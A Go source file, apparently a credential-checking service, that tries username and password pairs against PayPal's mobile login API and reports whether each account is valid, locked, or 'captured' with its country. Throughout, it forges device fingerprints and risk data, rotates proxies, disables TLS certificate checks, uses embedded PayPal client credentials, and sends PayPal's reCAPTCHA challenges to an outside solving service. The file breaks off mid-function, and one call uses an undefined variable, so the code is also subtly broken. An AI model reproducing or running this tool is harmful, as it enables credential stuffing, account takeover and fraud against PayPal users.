package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"golang.org/x/net/http2"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
	}
	allowedIPs map[string]struct{}
)

func loadAllowedIPs(filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	content, err := io.ReadAll(file)
	if err != nil {
		return err
	}

	lines := strings.Split(strings.TrimSpace(string(content)), "\n")
	allowedIPs = make(map[string]struct{}, len(lines))
	for _, ip := range lines {
		trimmedIP := strings.TrimSpace(ip)
		if trimmedIP != "" {
			allowedIPs[trimmedIP] = struct{}{}
		}
	}
	return nil
}

func ipAuthMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		remoteIP, _, _ := net.SplitHostPort(r.RemoteAddr)

		if _, allowed := allowedIPs[remoteIP]; !allowed {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func main() {
	loadAllowedIPs("Files/authorized.txt")

	mux := http.NewServeMux()

	mux.Handle("/check", ipAuthMiddleware(http.HandlerFunc(checkHandler)))
	mux.Handle("/gen", ipAuthMiddleware(http.HandlerFunc(getGuidHandler)))

	fmt.Printf("Server listening on port 8080\n")
	server := &http.Server{Addr: ":8080", Handler: mux}
	server.ListenAndServe()
}

func checkHandler(w http.ResponseWriter, r *http.Request) {
	password := r.URL.Query().Get("password")
	username := r.URL.Query().Get("username")

	if len(password) < 5 || !strings.Contains(username, "@") {
		http.Error(w, "Failure", http.StatusBadRequest)
		return
	}

	proxy := r.URL.Query().Get("proxy")
	gay22 := r.URL.Query().Get("token")

	if username == "" || proxy == "" || gay22 == "" {
		w.Write([]byte(`Retry`))
		return
	}

	tokenResp, err := getAuthToken(username, password, proxy, gay22)
	if err != nil {
		tokenResp, err = getAuthToken(username, password, proxy, gay22)
		if err != nil {
			w.Write([]byte(`Retry`))
			return
		}
	}

	if strings.Contains(tokenResp, `403 Forbidden`) || strings.Contains(tokenResp, `dointeractivechallenge`) {
		w.Write([]byte(`Retry`))
		return
	}
	if strings.Contains(tokenResp, `AuthenticationFailure`) {
		w.Write([]byte(`Failure`))
		return
	}
	if strings.Contains(tokenResp, `For your security, we’ve temporarily locked your account.`) || strings.Contains(tokenResp, "Safe") || strings.Contains(tokenResp, "safe") {
		w.Write([]byte(`Locked`))
		return
	}

	var tokenRespMap map[string]interface{}
	err = json.Unmarshal([]byte(tokenResp), &tokenRespMap)
	if err != nil {
		w.Write([]byte(`Retry`))
		return
	}

	var response string

	if result, ok := tokenRespMap["result"].(map[string]interface{}); ok {
		if firstPartyData, ok := result["firstPartyUserAccessToken"].(map[string]interface{}); ok {
			if tokenValue, ok := firstPartyData["tokenValue"].(string); ok {
				response = heliosHandler(accessToken, proxy)
			}
		}

		if challengeData, ok := result["challenge"].(map[string]interface{}); ok {
			if accessToken, ok := challengeData["accessToken"].(string); ok {
				response = heliosHandler(accessToken, proxy)
			}
		}
	}

	w.Write([]byte(`{"Capture":"` + response + `"}`))
}

func generateDeviceID() string {
	return fmt.Sprintf("%s-%s-%s-%s-%s",
		generateRandomHex(8),
		generateRandomHex(4),
		generateRandomHex(4),
		generateRandomHex(4),
		generateRandomHex(12))
}

type RiskData struct {
	IsRooted    bool   `json:"is_rooted"`
	IsEmulator  bool   `json:"is_emulator"`
	DeviceModel string `json:"device_model"`
	AppVersion  string `json:"app_version"`
	DCID        string `json:"dc_id"`
	MGID        string `json:"mg_id"`
	NC          []int  `json:"nc"`
	TZ          int    `json:"tz"`
	SR          struct {
		AC bool `json:"ac"`
		MG bool `json:"mg"`
		GY bool `json:"gy"`
	} `json:"sr"`
	MagnesSource int `json:"magnes_source"`
	CPU          struct {
		State       int `json:"state"`
		ActiveCores int `json:"activecores"`
		Cores       int `json:"cores"`
	} `json:"cpu"`
	LocationAuthStatus string   `json:"location_auth_status"`
	VendorIdentifier   string   `json:"vendor_identifier"`
	IPAddresses        []string `json:"ip_addresses"`
	OSVersion          string   `json:"os_version"`
	LocalIdentifier    string   `json:"local_identifier"`
	LocaleCountry      string   `json:"locale_country"`
	Battery            struct {
		State int     `json:"state"`
		Level float64 `json:"level"`
	} `json:"battery"`
	MagnesGUID struct {
		CreatedAt int64  `json:"created_at"`
		ID        string `json:"id"`
	} `json:"magnes_guid"`
	LocaleLang       string `json:"locale_lang"`
	AppID            string `json:"app_id"`
	TouchIDAvailable string `json:"TouchIDAvailable"`
	SMSEnabled       bool   `json:"sms_enabled"`
	EmailConfigured  bool   `json:"email_configured"`
	Timestamp        int64  `json:"timestamp"`
	TZName           string `json:"tz_name"`
	UserAgent        struct {
		DUA string `json:"dua"`
	} `json:"user_agent"`
	RiskCompSessionID   string `json:"risk_comp_session_id"`
	OSTypeDetail        string `json:"os_type_detail"`
	BindSchemeAvailable string `json:"bindSchemeAvailable"`
	BindSchemeEnrolled  string `json:"bindSchemeEnrolled"`
	CloudIdentifier     string `json:"cloud_identifier"`
	TouchIDEnrolled     string `json:"TouchIDEnrolled"`
	ConfVersion         string `json:"conf_version"`
	Screen              struct {
		MaxFrames  int     `json:"max_frames"`
		Scale      float64 `json:"scale"`
		Mirror     bool    `json:"mirror"`
		Height     int     `json:"height"`
		Brightness float64 `json:"brightness"`
		Width      int     `json:"width"`
		Capture    int     `json:"capture"`
	} `json:"screen"`
	C      int  `json:"c"`
	DBG    bool `json:"dbg"`
	System struct {
		Version    string `json:"version"`
		Hardware   string `json:"hardware"`
		Name       string `json:"name"`
		SystemType string `json:"system_type"`
	} `json:"system"`
	OSType      string `json:"os_type"`
	ConnType    string `json:"conn_type"`
	AppGUID     string `json:"app_guid"`
	DeviceName  string `json:"device_name"`
	PayloadType string `json:"payload_type"`
	LinkerID    string `json:"linker_id"`
	ConfURL     string `json:"conf_url"`
	Memory      struct {
		Total int64 `json:"total"`
	} `json:"memory"`
	CompVersion          string `json:"comp_version"`
	PasscodeSet          string `json:"PasscodeSet"`
	IPAddrs              string `json:"ip_addrs"`
	PairingID            string `json:"pairing_id"`
	RF                   string `json:"rf"`
	PinLockLastTimestamp int64  `json:"pin_lock_last_timestamp"`
	DS                   bool   `json:"ds"`
	SourceAppVersion     string `json:"source_app_version"`
	T                    bool   `json:"t"`
}

func generateRandomHex(length int) string {
	bytes := make([]byte, length/2)
	if _, err := rand.Read(bytes); err != nil {
		return strings.Repeat("0", length)
	}
	return hex.EncodeToString(bytes)
}

func generateDeviceModel() string {
	models := []string{
		"SM-G930F", "SM-G935F", "SM-G950F", "SM-G955F", "SM-G960F", "SM-G965F",
		"SM-G970F", "SM-G975F", "SM-G973F", "SM-G977F", "SM-G980F", "SM-G985F",
		"SM-G986B", "SM-G988B", "SM-G991B", "SM-G996B", "SM-G998B",
	}
	return models[mathrand.Intn(len(models))]
}

func generateRandomMacAddress() string {
	mac := make([]byte, 6)
	_, err := rand.Read(mac)
	if err != nil {
		return "00:00:00:00:00:00"
	}
	mac[0] = mac[0] & 0xFE
	mac[0] = mac[0] | 0x02
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
}

func generateRandomIPv4Address() string {
	ipAddr := make([]byte, 4)
	rand.Read(ipAddr)
	return fmt.Sprintf("%d.%d.%d.%d", ipAddr[0], ipAddr[1], ipAddr[2], ipAddr[3])
}

func generateAppGuid() string {
	return uuid.New().String()
}
func getRandomVersion() string {
	versions := []string{
		"RQ3A.210505.003",
		"PQ1A.190205.001",
		"SP1A.210812.001",
		"G998BXXU1AUG3",
		"BQ1A.200205.010",
		"SD1A.211205.001",
		"TP1A.220405.004",
		"AOSP 11.0.0 r1",
		"SR1A.200720.002",
		"PPR1.180610.009",
		"S1B.190720.001",
		"Android 12.0.0_r1",
		"QP1A.211005.002",
		"FQ3A.210609.007",
		"H9820.220101.001",
		"PQ2A.211005.001",
		"SP1A.210715.012",
		"TP1A.210905.003",
		"SD1A.211006.005",
		"RQ3A.210901.001",
	}

	mathrand.Seed(time.Now().UnixNano())

	randomIndex := mathrand.Intn(len(versions))

	return versions[randomIndex]
}

func getDeviceResolutions() (string, string) {
	widths := []string{
		"1080", "1080", "1080", "1440", "1440",
		"1080", "1644", "1080", "1080", "1080",
	}

	heights := []string{
		"2340", "2400", "2400", "3200", "3088",
		"2400", "3840", "2400", "2400", "2460",
	}

	mathrand.Seed(time.Now().UnixNano())

	randomIndex := mathrand.Intn(len(widths))
	randomIndex1 := mathrand.Intn(len(heights))

	return widths[randomIndex], heights[randomIndex1]
}

func generateRiskData(us, ps, appGuid, id, geneddevicemodel, ScreenModel string) string {
	username := url.QueryEscape(us)
	password := url.QueryEscape(ps)

	name := "com.paypal.merchant.client"

	Time := time.Now().UnixNano() / int64(time.Millisecond)
	seconds := fmt.Sprintf("%d", Time)

	authnonce := name + appGuid + id + us + string(ps[:3]) + seconds

	d := url.QueryEscape(sha256Base64(authnonce))

	sessionid := uuid.New().String()
	gay := uuid.New().String()

	geneddevicename := GetDeviceName()
	genedmacaddress := generateRandomMacAddress()
	geneddeviceid := generateDeviceID()
	ipddy := generateRandomIPv4Address()

	hexString := generateRandomHex(16)
	hexString2 := generateRandomHex(16)
	hexString3 := generateRandomHex(16)

	mathrand.Seed(time.Now().UnixNano())
	gay2 := int64(1726267999528) + mathrand.Int63n(10000)
	gay3 := int64(1726268007711) + mathrand.Int63n(10000)
	gay4 := 1630620 + mathrand.Intn(10000)
	gay5 := 12757325 + mathrand.Intn(10000)
	gay6 := 402653184 + mathrand.Intn(10000)
	gay7 := 29334621 + mathrand.Intn(10000)
	gay8 := int64(2939670528) + mathrand.Int63n(10000)
	gay9 := int64(4130201600) + mathrand.Int63n(10000)
	gay10 := int64(125856731136) + mathrand.Int63n(10000)
	gay11 := int64(1726267999528) + mathrand.Int63n(10000)
	gay12 := 2803200 + mathrand.Intn(10000)
	gay13 := 825600 + mathrand.Intn(10000)
	width, height := getDeviceResolutions()

	riskdata := "{\"app_guid\":\"" + appGuid + "\",\"app_id\":\"com.paypal.merchant.client\",\"android_id\":\"" + id + "\",\"app_version\":\"8.58.0\",\"app_first_install_time\":" + strconv.FormatInt(gay2, 10) + ",\"app_last_update_time\":" + strconv.FormatInt(gay11, 10) + ",\"conf_url\":\"https:\\/\\/www.paypalobjects.com\\/rdaAssets\\/magnes\\/magnes_android_rec_v6.json\",\"comp_version\":\"6.5.1.release\",\"device_model\":\"" + geneddevicemodel + "\",\"device_name\":\"" + geneddevicename + "\",\"gsf_id\":\"" + geneddeviceid + "\",\"is_emulator\":false,\"ef\":\"00200\",\"is_rooted\":false,\"rf\":\"0010000\",\"os_type\":\"Android\",\"os_version\":\"" + strconv.Itoa(mathrand.Intn(10)+5) + "\",\"payload_type\":\"full\",\"sms_enabled\":true,\"mac_addrs\":\"" + genedmacaddress + "\",\"magnes_guid\":{\"id\":\"" + gay + "\",\"created_at\":" + strconv.FormatInt(gay3, 10) + "},\"magnes_source\":11,\"source_app_version\":\"8.58.0\",\"total_storage_space\":" + strconv.FormatInt(gay10, 10) + ",\"screen\":{\"width\":" + width + ",\"height\":" + height + ",\"density\":2,\"densityDpi\":350,\"scale\":2,\"xdpi\":260,\"ydpi\":210,\"brightness\":" + strconv.Itoa(mathrand.Intn(100)+20) + "},\"cpu\":{\"cores\":4,\"maxFreq\":" + strconv.Itoa(gay12) + ",\"minFreq\":" + strconv.Itoa(gay13) + "},\"disk\":{\"total\":" + strconv.FormatInt(gay10, 10) + ",\"total_sd\":-500,\"mounted\":false,\"free\":" + strconv.FormatInt(gay8, 10) + ",\"free_sd\":-500},\"system\":{\"version\":\"Linux 5." + strconv.Itoa(mathrand.Intn(3)+1) + "." + strconv.Itoa(mathrand.Intn(20)+20) + "\",\"board\":\"msmnile\",\"bootloader\":\"bcc1-0.1-" + strconv.Itoa(mathrand.Intn(4948814-4000000+1)+4000000) + "\",\"cpu_abi1\":\"x86_64\",\"display\":\"" + geneddevicename + "-user 13 " + ScreenModel + " " + strconv.Itoa(mathrand.Intn(1201230922-1000000000+1)+1000000000) + " release-keys\",\"radio\":-400,\"fingerprint\":\"samsung\\/" + geneddevicename + "\\/" + geneddevicename + ":12\\/" + ScreenModel + "\\/" + strconv.Itoa(mathrand.Intn(1201230922-1000000000+1)+1000000000) + ":user\\/release-keys\",\"hardware\":\"qcom\",\"manufacturer\":\"samsung\",\"product\":\"" + geneddevicename + "\",\"time\":" + seconds + ",\"system_type\":\"x86_64\"},\"user_agent\":{\"dua\":\"Mozilla\\/3.0 (Linux; Android " + strconv.Itoa(mathrand.Intn(10)+5) + "; " + geneddevicemodel + " Build\\/" + ScreenModel + "; wv) AppleWebKit\\/537.36 (KHTML, like Gecko) Version\\/2.0 Chrome\\/93.0.4638.74 Mobile Safari\\/534.36\"},\"t\":true,\"pairing_id\":\"" + hexString + "\",\"bssid\":\"" + genedmacaddress + "\",\"conn_type\":\"WIFI\",\"conf_version\":\"6.0\",\"dmo\":true,\"dc_id\":\"" + hexString2 + "\",\"device_uptime\":" + strconv.Itoa(gay4) + ",\"ip_addrs\":\"" + ipddy + "\",\"ip_addresses\":[\"" + ipddy + "\"],\"locale_country\":\"US\",\"locale_lang\":\"en\",\"phone_type\":\"gsm\",\"risk_comp_session_id\":\"" + sessionid + "\",\"roaming\":false,\"sim_operator_name\":\"\",\"ssid\":\"\\\"Guest\\\"\",\"timestamp\":" + seconds + ",\"tz_name\":\"East Africa Time\",\"ds\":false,\"tz\":10700000,\"network_operator\":\"" + strconv.Itoa(mathrand.Intn(42502-40000+1)+42502) + "\",\"c\":\"7\",\"mg_id\":\"" + hexString3 + "\",\"pl\":\"001600\",\"battery\":{\"temp\":328,\"voltage\":5510,\"state\":4,\"method\":2,\"level\":\".99\",\"current\":-2117423348,\"low_power\":0},\"memory\":{\"free_runtime\":" + strconv.Itoa(gay5) + ",\"max_runtime\":" + strconv.Itoa(gay6) + ",\"total_runtime\":" + strconv.Itoa(gay7) + ",\"free\":" + strconv.FormatInt(gay8, 10) + ",\"total\":" + strconv.FormatInt(gay9, 10) + "},\"sr\":{\"ac\":true,\"gy\":true,\"mg\":true},\"bindSchemeAvailable\":\"none\",\"bindSchemeEnrolled\":\"none\"}"

	deviceinfo := fmt.Sprintf(`{"device_identifier":"%s","device_os":"Android","device_os_version":"%d","device_name":"%s","device_model":"%s","device_type":"Android","device_key_type":"ANDROIDGSM_PHONE","is_device_simulator":false,"pp_app_id":"APP-4XA127925G233932C"}`, id, mathrand.Intn(10)+5, geneddevicename, geneddevicemodel)

	appinfo := fmt.Sprintf(`{"device_app_id":"APP-4XA127925G233932C","client_platform":"AndroidGSM","app_version":"8.58.0","app_category":"3","app_guid":"%s","push_notification_id":"disabled"}`, appGuid)

	EncodedRiskData := url.QueryEscape(riskdata)
	Encodeddeviceinfo := url.QueryEscape(deviceinfo)
	Encodedappinfo := url.QueryEscape(appinfo)
	
	w := fmt.Sprintf("redirectUri=urn%%3Aietf%%3Awg%%3Aoauth%%3A2.0%%3Aoob&authNonce=%s&appInfo=%s&riskData=%s&deviceInfo=%s&firstPartyClientAccessToken=A21AAN3DId0ngpQRvLNeLCtlleP4sEjz9wcGsnLU12vnIi54SvL6kfR4QkeqlyyKj1g27CK7N3wZ8f5dN_i27I5cF4cMA8Afw&timeStamp=%s&password=%s&tenantName=PayPal&firstPartyClientId=AVgxIgoMnHi2_yD__etYlYNDza9vU-vJfHuqRKx5weeIizTxeZoC8Ec4WWyyZK6ELQJbvu8CiRyP-7Yf&adsChallengeId=auth-%s&adsCreatePageData=%%7B%%22startTime%%22%%3A%s%%2C%%22elapseTime%%22%%3A512%%2C%%22status%%22%%3A%%22SUCCESS%%22%%7D&rememberMe=false&grantType=password&email=%s", d, Encodedappinfo, EncodedRiskData, Encodeddeviceinfo, seconds, password, appGuid, seconds, username)
	return w
}

func GetDeviceName() string {
	return fmt.Sprintf("SM-%s", generateRandomHex(4))
}

func heliosHandler(token, proxy string) string {

	var transport *http.Transport

	proxyParts := strings.Split(proxy, ":")
	if len(proxyParts) != 4 {
		return "Retry"
	}

	proxyHost, proxyPort, proxyUser, proxyPass := proxyParts[0], proxyParts[1], proxyParts[2], proxyParts[3]
	proxyURL := &url.URL{
		Scheme: "http",
		Host:   proxyHost + ":" + proxyPort,
		User:   url.UserPassword(proxyUser, proxyPass),
	}

	transport = &http.Transport{
		Proxy:             http.ProxyURL(proxyURL),
		MaxIdleConns:      100,
		IdleConnTimeout:   90 * time.Second,
		DisableKeepAlives: false,
	}

	err := http2.ConfigureTransport(transport)
	if err != nil {
		return "Retry"
	}

	jar, err := cookiejar.New(nil)
	if err != nil {
		return "Retry"
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   30 * time.Second,
	}

	uai := userAgents[mathrand.Intn(len(userAgents))]
	url1 := "https://www.paypal.com/webapps/helios?token=null"
	req, err := http.NewRequest("GET", url1, nil)
	if err != nil {
		return "Retry"

	}
	req.Header.Set("User-Agent", uai)
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-US,en;q=0.8")
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := client.Do(req)
	if err != nil {
		return "Retry"

	}
	defer resp.Body.Close()

	respUpdate, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "Retry"

	}
	bodyStr := string(respUpdate)

	if strings.Contains(bodyStr, "first_name") {
		country := extractSecondValue(bodyStr, `"country": "`, `",`)
		index := strings.Index(country, `"`)
		if index != -1 {
			country = country[:index]
		}
		return "Country: " + country + " "
	} else {
		uai := userAgents[mathrand.Intn(len(userAgents))]
		url1 := "https://www.paypal.com/webapps/helios?token=null"
		req, err := http.NewRequest("GET", url1, nil)
		if err != nil {
			return "Retry"

		}
		req.Header.Set("User-Agent", uai)
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Accept-Language", "en-US,en;q=0.8")
		req.Header.Set("Authorization", "Bearer "+token)

		resp, err := client.Do(req)
		if err != nil {
			return "Retry"

		}
		defer resp.Body.Close()

		respUpdate, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return "Retry"

		}
		bodyStr := string(respUpdate)
		if strings.Contains(bodyStr, "first_name") {
			country := extractSecondValue(bodyStr, `"country": "`, `",`)
			index := strings.Index(country, `"`)
			if index != -1 {
				country = country[:index]
			}
		return "Country: " + country + " "
		} else {
			return "Failure: Invalid"
		}
	}
}

func getAuthToken(username, password, proxy, appGuid string) (string, error) {
	proxyParts := strings.Split(proxy, ":")

	proxyURL := &url.URL{
		Scheme: "http",
		Host:   net.JoinHostPort(proxyParts[0], proxyParts[1]),
		User:   url.UserPassword(proxyParts[2], proxyParts[3]),
	}

	transport := &http.Transport{
		Proxy:             http.ProxyURL(proxyURL),
		MaxIdleConns:      0,
		IdleConnTimeout:   5 * time.Second,
		MaxConnsPerHost:   10000,
		DisableKeepAlives: false,
		ForceAttemptHTTP2: true,
		TLSClientConfig: &tls.Config{
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS12,
			InsecureSkipVerify: true,
		},
	}

	if err := http2.ConfigureTransport(transport); err != nil {
		return "", fmt.Errorf("failed to configure HTTP/2 transport: %v", err)
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	deviceId := generateRandomHex(16)
	deviceModel := generateDeviceModel()
	reqID, _ := GenerateHexString(16)
	metadataID, _ := GenerateHexString(16)
	userGUID := uuid.NewString()
	contextID := uuid.NewString()
	sessionGUID := uuid.NewString()
	usageTrackerID := strings.ToUpper(uuid.NewString())
	ScreenModel := getRandomVersion()
	riskData := generateRiskData(username, password, appGuid, deviceId, deviceModel, ScreenModel)
	if riskData == "Failure" {
		return "Failure", fmt.Errorf("failed to generate risk data")
	}

	req, err := http.NewRequest("POST", "https://api-m.paypal.com/v1/mfsauth/proxy-auth/token", strings.NewReader(riskData))
	if err != nil {
		return "Retry", err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 12; SM-N976N Build/QP1A.190711.020)")
	req.Header.Set("Host", "api-m.paypal.com")
	req.Header.Set("Paypal-Client-Metadata-Id", metadataID)
	req.Header.Set("X-Paypal-Fpti", url.QueryEscape(fmt.Sprintf(`{"user_guid":"%s","context_id":"%s","user_session_guid":"%s"}`, userGUID, contextID, sessionGUID)))
	req.Header.Set("X-Paypal-Consumerapp-Context", url.QueryEscape(fmt.Sprintf(`{"visitorId":"%s","deviceLocationCountry":"US","deviceLocale":"en_US","deviceLanguage":"en","appName":"com.paypal.merchant.client","appGuid":"%s","appVersion":"8.58.0","sdkVersion":"5.0.2-SNAPSHOT","deviceOS":"Android","deviceOSVersion":"12","deviceMake":"samsung","deviceModel":"%s","deviceType":"Android","deviceNetworkType":"Unknown","deviceNetworkCarrier":"Unknown","deviceId":"%s","usageTrackerSessionId":"%s"}`, deviceId, appGuid, deviceModel, deviceId, usageTrackerID)))
	req.Header.Set("Authorization", "Basic QVZneElnb01uSGkyX3lEX19ldFlsWU5EemE5dlUtdkpmSHVxUkt4NXdlZUlpelR4ZVpvQzhFYzRXV3l5Wks2RUxRSmJ2dThDaVJ5UC03WWY6")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Encoding", "gzip")
	req.Header.Set("Paypal-Request-Id", reqID)

	resp, err := client.Do(req)
	if err != nil {
		return "Retry", err
	}
	defer resp.Body.Close()

	var reader io.ReadCloser
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return "", fmt.Errorf("failed to create gzip reader: %v", err)
		}
		defer reader.Close()
	default:
		reader = resp.Body
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		return "Retry", err
	}

	return string(body), nil
}

func C1DSolver(proxy, cakkey string) (string, error) {
	proxyParts := strings.Split(proxy, ":")
	proxyHost, proxyPort, proxyUser, proxyPass := proxyParts[0], proxyParts[1], proxyParts[2], proxyParts[3]
	proxyURL := &url.URL{
		Scheme: "http",
		Host:   proxyHost + ":" + proxyPort,
		User:   url.UserPassword(proxyUser, proxyPass),
	}

	transport := &http.Transport{
		Proxy:           http.ProxyURL(proxyURL),
		MaxIdleConns:    500,
		IdleConnTimeout: 15 * time.Second,
		MaxConnsPerHost: 500,
		TLSClientConfig: &tls.Config{
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS12,
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	captchaClient := &http.Client{
		Timeout: 50 * time.Second,
	}

	urls := "https://asskicker.xyz/SolveCaptcha"
	req, err := http.NewRequest("POST", urls, strings.NewReader(`{"clientKey":"`+cakkey+`","type":"ReCaptchaV3EnterpriseTaskProxyless","websiteURL":"https://www.paypal.com/auth/recaptcha/grcenterprise_v3.html","websiteKey":"6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB","isInvisible": true,"pageAction":"default"}`))

	req.Header.Set("Content-Type", "application/json")

	if err != nil {
		return "", err
	}

	resp, err := captchaClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()
	log.Println("Test3")

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("error reading response body: %v", err)
	}
	log.Println(string(body))

	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		return "", fmt.Errorf("error parsing JSON: %v", err)
	}

	response, ok := result["token"].(string)
	if !ok {
		return "", fmt.Errorf("token not found in response")
	}
	auth1 := generateAppGuid()
	auth2 := generateAppGuid()

	urls = `https://www.paypal.com/auth/` + auth1 + `/createchallengepage?p=auth-` + auth2 + `&source=com.paypal.merchant.client`
	req, err = http.NewRequest("GET", urls, nil)
	if err != nil {
		return "", err
	}

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Priority", "u=0, i")
	req.Header.Set("Sec-CH-UA", `"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"`)
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Sec-GPC", "1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")

	resp, err = client.Do(req)
	if err != nil {
		log.Println(err)
		return "", err
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
		return "", err
	}

	decodedBody, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		log.Println(err)
		decodedBody = body
	}

	reader, err := gzip.NewReader(bytes.NewReader(decodedBody))
	if err != nil {
		log.Println(err)
		return string(decodedBody), nil
	}
	defer reader.Close()

	decompressedBody, err := ioutil.ReadAll(reader)
	if err != nil {
		log.Println(err)
		return "", err
	}
	cookies := resp.Cookies()
	var cookieStrs []string
	for _, cookie := range cookies {
		cookieStrs = append(cookieStrs, fmt.Sprintf("%s=%s", cookie.Name, cookie.Value))
	}

	gaysssss := strings.Join(cookieStrs, "; ")

	csrf := extractValue(string(decompressedBody), `"_csrf=" + encodeURIComponent("`, `")`)
	sesid := extractValue(string(decompressedBody), `&_sessionID=" + encodeURIComponent("`, `")`)
	reftime := extractValue(string(decompressedBody), `&refTimestamp=`, `"`)
	reftimeA, _ := strconv.Atoi(reftime)

	start := reftimeA + 398
	end := reftimeA + 1275

	startStr := strconv.Itoa(start)
	endStr := strconv.Itoa(end)

	csrfenc := url.QueryEscape(csrf)

	gay := `_csrf=` + csrfenc + `&refTimestamp=` + reftime + `&grcV3EntToken=` + response + `&publicKey=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&grcV3RenderStartTime=` + startStr + `&grcV3RenderEndTime=` + endStr + `&_sessionID=` + sesid

	urls = `https://www.paypal.com/auth/verifygrcenterprise`
	req, err = http.NewRequest("POST", urls, strings.NewReader(gay))
	if err != nil {
		log.Println("Error1")
		return "", err
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "https://www.paypal.com")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Priority", "u=1, i")
	req.Header.Set("Referer", "https://www.paypal.com/auth/"+auth1+"/createchallengepage?p=auth-"+auth2+"&source=com.paypal.merchant.client")
	req.Header.Set("Sec-CH-UA", `"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"`)
	req.Header.Set("Sec-CH-UA-Arch", `"x86"`)
	req.Header.Set("Sec-CH-UA-Bitness", `"64"`)
	req.Header.Set("Sec-CH-UA-Full-Version-List", `"Chromium";v="128.0.0.0", "Not;A=Brand";v="24.0.0.0", "Brave";v="128.0.0.0"`)
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Model", `""`)
	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
